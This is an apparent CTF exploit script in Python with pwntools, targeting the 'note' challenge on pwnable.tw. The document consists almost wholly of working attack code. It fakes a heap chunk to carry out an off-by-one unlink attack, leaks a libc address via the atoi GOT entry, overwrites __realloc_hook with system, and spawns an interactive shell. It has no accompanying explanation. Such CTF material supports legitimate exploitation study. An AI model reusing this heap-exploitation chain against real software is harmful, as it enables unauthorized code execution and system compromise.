## file: exp for note ## date: 2018-04-19## author: raycpfrom pwn import *from ctypes import *DEBUG = 1if DEBUG:     #p1 = process('./note')     p=remote('127.0.0.1', 1234 )     #scontext.log_level = 'debug'     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     #p = process(['./babystack.dms'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc_64.so.6')})     #libc = ELF('libc_64.so.6')     else:     p = remote('chall.pwnable.tw', 10205, )     libc = ELF('libc_64.so.6')#context.log_level = 'debug'wordSz = 4hwordSz = 2bits = 32PIE = 0mypid=0def leak(address, size):   with open('/proc/%s/mem' % mypid) as mem:      mem.seek(address)      return mem.read(size)def findModuleBase(pid, mem):   name = os.readlink('/proc/%s/exe' % pid)   with open('/proc/%s/maps' % pid) as maps:      for line in maps:         if name in line:            addr = int(line.split('-')[0], 16)            mem.seek(addr)            if mem.read(4) == "\x7fELF":               bitFormat = u8(leak(addr + 4, 1))               if bitFormat == 2:                  global wordSz                  global hwordSz                  global bits                  wordSz = 8                  hwordSz = 4                  bits = 64               return addr   log.failure("Module's base address not found.")   sys.exit(1)def debug(addr):    global mypid    mypid = proc.pidof(p)[0]    #raw_input('debug:')    with open('/proc/%s/mem' % mypid) as mem:        moduleBase = findModuleBase(mypid, mem)        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))def change_title(data):    p.recvuntil('n--->>')    p.sendline('1')    p.recvuntil('title:')    p.send(data)def change_content(size,data):    p.recvuntil('n--->>')    p.sendline('2')    p.recvuntil('(64-256):')    p.sendline(str(size))    p.recvuntil('content:')    p.send(data)def change_comment(data):    p.recvuntil('n--->>')    p.sendline('3')    p.recvuntil('comment:')    p.send(data)    def show_content():    p.recvuntil('n--->>')    p.sendline('4')    title_addr=0x602070atoi_got=0x0000000000601fd0revise_count=0x602050def pwn():        ## step 1 unlink attack    fake_chunk=p64(0)+p64(0x20)+p64(title_addr-0x18)+p64(title_addr-0x10)+p64(0x20)+p8(0x40)    ##p8(0x40) off-by-one    change_title(fake_chunk)    stri='a'*0x38+p64(0x41)    change_content(0x78,stri+'\n')    change_content(0x1000,'a'*20+'\n')    change_content(0x100000,'/bin/sh\x00'*20+'\n')    data=p64(atoi_got)+p64(atoi_got)    ## step 2 leak address    change_title(data+'\n')    show_content()    p.recvuntil('is:')    data=p.recvuntil('\x7f').ljust(8,'\x00')    print data,len(data)    atoi_addr=u64(data)    print "atoi addr",hex(atoi_addr)    libc_base=atoi_addr-libc.symbols['atoi']    realloc_hook_addr=libc_base+libc.symbols['__realloc_hook']    system_addr=libc_base+libc.symbols['system']    ## step 3 overwrite __realloc_hook ptr    change_title(p64(revise_count)+p64(atoi_got)+'\n')    change_comment(p64(0)+p64(realloc_hook_addr)+p64(0x602068)+'/bin/sh\x00'+'\n')    change_comment(p64(system_addr)+'\n')        p.sendline('2')    p.recvuntil('-256):')    p.sendline('12')    p.interactive()if __name__ == '__main__':   pwn()     